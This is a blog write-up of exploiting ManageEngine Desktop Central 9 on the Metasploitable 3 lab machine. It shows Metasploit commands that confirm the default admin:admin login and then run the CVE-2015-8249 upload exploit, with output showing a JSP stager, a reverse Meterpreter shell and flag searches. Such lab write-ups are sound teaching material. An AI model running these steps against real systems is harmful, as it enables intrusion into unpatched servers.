---
layout: post
title: "Metasploitable 3 - ManageEngine DesktopCentral 9"
date: 2017-01-12T04:44:00Z
author: gu4r15sm0
category: metasploitable
tags: [metasploitable3, exploitation]
---

Metasploitable 3
Remote Code Execution on ManageEngine DesktopCentral 9
If you remember, we found a Apache Tomcat running on TCP port 8022

```bash
msf > services
Services
========
host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.20.10.23  21     tcp    ftp           open   Microsoft ftpd
10.20.10.23  22     tcp    ssh           open   OpenSSH 7.1 protocol 2.0
10.20.10.23  80     tcp    http          open   Microsoft IIS httpd 7.5
10.20.10.23  161    udp    snmp          open   SNMPv1 server public
10.20.10.23  1617   tcp    nimrod-agent  open   
10.20.10.23  3000   tcp    http          open   WEBrick httpd 1.3.1 Ruby 2.3.1 (2016-04-26)
10.20.10.23  4848   tcp    ssl/http      open   Oracle GlassFish 4.0 Servlet 3.1; JSP 2.3; Java 1.8
10.20.10.23  5985   tcp    http          open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.20.10.23  8020   tcp    http          open   Apache httpd
10.20.10.23  8022   tcp    http          open   Apache Tomcat/Coyote JSP engine 1.1
10.20.10.23  8027   tcp                  open   
10.20.10.23  8080   tcp    http          open   Oracle GlassFish 4.0 Servlet 3.1; JSP 2.3; Java 1.8

10.20.10.23  8282   tcp    http          open   Apache-Coyote/1.1 ( 401-Basic realm="Tomcat Manager Application" )
10.20.10.23  8383   tcp    ssl/http      open   Apache httpd
10.20.10.23  8484   tcp    http          open   Jetty winstone-2.8
10.20.10.23  8585   tcp    http          open   Apache httpd 2.2.21 (Win64) PHP/5.3.10 DAV/2
10.20.10.23  9200   tcp    http          open   Elasticsearch REST API 1.1.1 name: Mammomax; Lucene 4.7
10.20.10.23  49153  tcp    msrpc         open   Microsoft Windows RPC
10.20.10.23  49154  tcp    msrpc         open   Microsoft Windows RPC
10.20.10.23  49263  tcp                  open   
10.20.10.23  49264  tcp    tcpwrapped    open   
```


So I decided to investigate by opening a browser to see what application was running on tomcat

[![](/assets/images/desktopcentral9.JPG)](/assets/images/desktopcentral9.JPG)

Desktop Central 9

I found a [ManageEngine - Desktop Central 9](https://www.manageengine.com/products/desktop-central/index.html?dci) login, with what looks like default credentials autocompleted.

Doing some research I found out that this wonderful Java App is very useful, it helps companies with

-   Patch Managment
-   Software Deployment
-   Remote Control
-   Asset Management
-   Service Pack Installation
-   User Administration
-   etc, etc, etc

There's even a Mobile App to do all that stuff on the go! Cool stuff!!

Going back to the default credentials, it seems that password is also 'admin', I could confirm it in the Web Interface, but I decided to use metasploit since this is Metasploitable anyway, right? :)

First, we look for what's available against ManageEngine products


```bash
msf > search manageengine

Matching Modules
```


================

   Name                                                            Disclosure Date  Rank       Description

   ----                                                            ---------------  ----       -----------

   auxiliary/admin/http/manage_engine_dc_create_admin              2014-12-31       normal     ManageEngine Desktop Central Administrator Account Creation

   auxiliary/admin/http/manageengine_dir_listing                   2015-01-28       normal     ManageEngine Multiple Products Arbitrary Directory Listing

   auxiliary/admin/http/manageengine_file_download                 2015-01-28       normal     ManageEngine Multiple Products Arbitrary File Download

   auxiliary/admin/http/manageengine_pmp_privesc                   2014-11-08       normal     ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection

   auxiliary/admin/http/netflow_file_download                      2014-11-30       normal     ManageEngine NetFlow Analyzer Arbitrary File Download

   auxiliary/gather/eventlog_cred_disclosure                       2014-11-05       normal     ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure

   auxiliary/scanner/http/manageengine_desktop_central_login                        normal     ManageEngine Desktop Central Login Utility

   auxiliary/scanner/http/manageengine_deviceexpert_traversal      2012-03-18       normal     ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal

   auxiliary/scanner/http/manageengine_deviceexpert_user_creds     2014-08-28       normal     ManageEngine DeviceExpert User Credentials

   auxiliary/scanner/http/manageengine_securitymanager_traversal   2012-10-19       normal     ManageEngine SecurityManager Plus 5.5 Directory Traversal

   auxiliary/scanner/http/servicedesk_plus_traversal               2015-10-03       normal     ManageEngine ServiceDesk Plus Path Traversal

   auxiliary/scanner/http/support_center_plus_directory_traversal  2014-01-28       normal     ManageEngine Support Center Plus Directory Traversal

   exploit/multi/http/eventlog_file_upload                         2014-08-31       excellent  ManageEngine Eventlog Analyzer Arbitrary File Upload

   exploit/multi/http/manage_engine_dc_pmp_sqli                    2014-06-08       excellent  ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection

   exploit/multi/http/manageengine_auth_upload                     2014-12-15       excellent  ManageEngine Multiple Products Authenticated File Upload

   exploit/multi/http/manageengine_sd_uploader                     2015-08-20       excellent  ManageEngine ServiceDesk Plus Arbitrary File Upload

   exploit/multi/http/manageengine_search_sqli                     2012-10-18       excellent  ManageEngine Security Manager Plus 5.5 Build 5505 SQL Injection

   exploit/multi/http/opmanager_socialit_file_upload               2014-09-27       excellent  ManageEngine OpManager and Social IT Arbitrary File Upload

   exploit/windows/http/desktopcentral_file_upload                 2013-11-11       excellent  ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload

   exploit/windows/http/desktopcentral_statusupdate_upload         2014-08-31       excellent  ManageEngine Desktop Central StatusUpdate Arbitrary File Upload

   exploit/windows/http/manage_engine_opmanager_rce                2015-09-14       manual     ManageEngine OpManager Remote Code Execution

   exploit/windows/http/manageengine_apps_mngr                     2011-04-08       average    ManageEngine Applications Manager Authenticated Code Execution

   exploit/windows/http/manageengine_connectionid_write            2015-12-14       excellent  ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability

   exploit/windows/misc/manageengine_eventlog_analyzer_rce         2015-07-11       manual     ManageEngine EventLog Analyzer Remote Code Execution

A lot of good stuff.

Ok let's use the auxiliary/scanner/http/manageengine_desktop_central_login to make sure our admin/admin creds work


```bash
msf > use auxiliary/scanner/http/manageengine_desktop_central_login

msf auxiliary(manageengine_desktop_central_login) > options

Module options (auxiliary/scanner/http/manageengine_desktop_central_login):


   Name              Current Setting  Required  Description

   ----              ---------------  --------  -----------

   BLANK_PASSWORDS   false            no        Try blank passwords for all users

   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5

   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database

   DB_ALL_PASS       false            no        Add all passwords in the current database to the list

   DB_ALL_USERS      false            no        Add all users in the current database to the list

   PASSWORD                           no        A specific password to authenticate with

   PASS_FILE                          no        File containing passwords, one per line

   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]

   RHOSTS                             yes       The target address range or CIDR identifier

   RPORT             8020             yes       The target port

   SSL               false            no        Negotiate SSL/TLS for outgoing connections

   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host

   THREADS           1                yes       The number of concurrent threads

   USERNAME                           no        A specific username to authenticate as

   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line

   USER_AS_PASS      false            no        Try the username as the password for all users

   USER_FILE                          no        File containing usernames, one per line

   VERBOSE           true             yes       Whether to print output for all attempts

   VHOST                              no        HTTP server virtual host
```

```


I set the USERNAME option to admin and the USER_AS_PASS to true so it tries the same username as the password.


```bash
msf auxiliary(manageengine_desktop_central_login) > set USER_AS_PASS true

USER_AS_PASS => true

msf auxiliary(manageengine_desktop_central_login) > set USERNAME admin

USERNAME => admin


```bash
msf auxiliary(manageengine_desktop_central_login) > options

Module options (auxiliary/scanner/http/manageengine_desktop_central_login):


   Name              Current Setting  Required  Description

   ----              ---------------  --------  -----------

   BLANK_PASSWORDS   false            no        Try blank passwords for all users

   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5

   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database

   DB_ALL_PASS       false            no        Add all passwords in the current database to the list

   DB_ALL_USERS      false            no        Add all users in the current database to the list

   PASSWORD                           no        A specific password to authenticate with

   PASS_FILE                          no        File containing passwords, one per line

   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]

   RHOSTS                             yes       The target address range or CIDR identifier

   RPORT             8020             yes       The target port

   SSL               false            no        Negotiate SSL/TLS for outgoing connections

   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host

   THREADS           1                yes       The number of concurrent threads

   USERNAME          admin            no        A specific username to authenticate as

   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line

   USER_AS_PASS      true             no        Try the username as the password for all users

   USER_FILE                          no        File containing usernames, one per line

   VERBOSE           true             yes       Whether to print output for all attempts

   VHOST                              no        HTTP server virtual host
```


I set the RHOSTS to the IP address of my Metasploitable 3 server, and RPORT to the TCP port reported by nmap and stored in my metasploite db

msf auxiliary(manageengine_desktop_central_login) > set RHOSTS 10.20.10.23

RHOSTS => 10.20.10.23

msf auxiliary(manageengine_desktop_central_login) > set RPORT 8022

RPORT => 8022

msf auxiliary(manageengine_desktop_central_login) > run

[+] MANAGEENGINE_DESKTOP_CENTRAL - Success: 'admin:admin'

[\*] Scanned 1 of 1 hosts (100% complete)

[\*] Auxiliary module execution completed
```


Confirmed! admin/admin is a valid credential and is now saved in my workspace in case I need it.


```bash
msf auxiliary(manageengine_desktop_central_login) > creds

Credentials

===========


host         origin       service          public  private  realm  private_type
```


----         ------       -------          ------  -------  -----  ------------

10.20.10.23  10.20.10.23  8022/tcp (http)  admin   admin           Password

Now let's try exploiting one of those. I chose the Desktop Central 9 FileUploadServlet ConnectionId Vulnerability:

[CVE-2015-8249](https://community.rapid7.com/community/infosec/blog/2015/12/14/r7-2015-22-manageengine-desktop-central-9-fileuploadservlet-connectionid-vulnerability-cve-2015-8249)


```bash
msf auxiliary(manageengine_desktop_central_login) > use exploit/windows/http/manageengine_connectionid_write

msf exploit(manageengine_connectionid_write) > options

Module options (exploit/windows/http/manageengine_connectionid_write):


   Name       Current Setting  Required  Description

   ----       ---------------  --------  -----------

   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]

   RHOST      10.20.10.23      yes       The target address

   RPORT      8020             yes       The target port

   SSL        false            no        Negotiate SSL/TLS for outgoing connections

   TARGETURI  /                yes       The base path for ManageEngine Desktop Central

   VHOST                       no        HTTP server virtual host
```


Exploit target:

   Id  Name

   --  ----

   0   ManageEngine Desktop Central 9 on Windows

I have to change the RPORT to 8022

msf exploit(manageengine_connectionid_write) > set RPORT 8022

RPORT => 8022

msf exploit(manageengine_connectionid_write) > run

[\*] Started reverse TCP handler on 10.23.10.200:4444 

[\*] Creating JSP stager

[\*] Uploading JSP stager MoRCg.jsp...

[\*] Executing stager...

[\*] Sending stage (957487 bytes) to 10.20.10.23

[\*] Meterpreter session 1 opened (10.23.10.200:4444 -> 10.20.10.23:64823) at 2017-01-11 22:11:46 -0500

[+] Deleted ../webapps/DesktopCentral/jspf/MoRCg.jsp

meterpreter > dir

Listing: C:\ManageEngine\DesktopCentral_Server\bin

==================================================

Mode              Size     Type  Last modified              Name

----              ----     ----  -------------              ----

100666/rw-rw-rw-  5        fil   2016-12-17 15:30:38 -0500  .lock

100777/rwxrwxrwx  587776   fil   2015-10-07 09:32:36 -0400  7za.exe

100666/rw-rw-rw-  2028     fil   2015-10-07 09:32:38 -0400  ComputerList.vbs
```


100666/rw-rw-rw-  624      fil   2016-12-17 15:29:35 -0500  ConfigServer_log.txt

100777/rwxrwxrwx  53248    fil   2015-10-07 09:32:38 -0400  ConvertSIDTOAccountName.exe

100777/rwxrwxrwx  228      fil   2015-10-07 09:32:36 -0400  CopyFolder.bat

100777/rwxrwxrwx  944      fil   2015-10-07 09:32:38 -0400  DCService.bat

...

**meterpreter** > pwd


```bash
C:\ManageEngine\DesktopCentral_Server\bin


```bash
meterpreter > shell
```
```


Process 5984 created.

Channel 2 created.

Microsoft Windows [Version 6.1.7601]

Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ManageEngine\DesktopCentral_Server\bin>whoami

whoami

**nt authority\\local service**

C:\ManageEngine\DesktopCentral_Server\bin>

I got a Remote Shell :) you can use this one to look for flags/cards or to gather more information about the system.

Back in meterpreter


```bash
meterpreter > search -f king\*

Found 4 results...

    c:\vagrant\resources\flags\kingofclubs.exe (824563 bytes)

    c:\wamp\www\wordpress\wp-content\uploads\2016\09\king_of_damonds-150x150.png (46738 bytes)

    c:\wamp\www\wordpress\wp-content\uploads\2016\09\king_of_damonds-214x300.png (130832 bytes)

    c:\wamp\www\wordpress\wp-content\uploads\2016\09\king_of_damonds.png (585695 bytes)
```
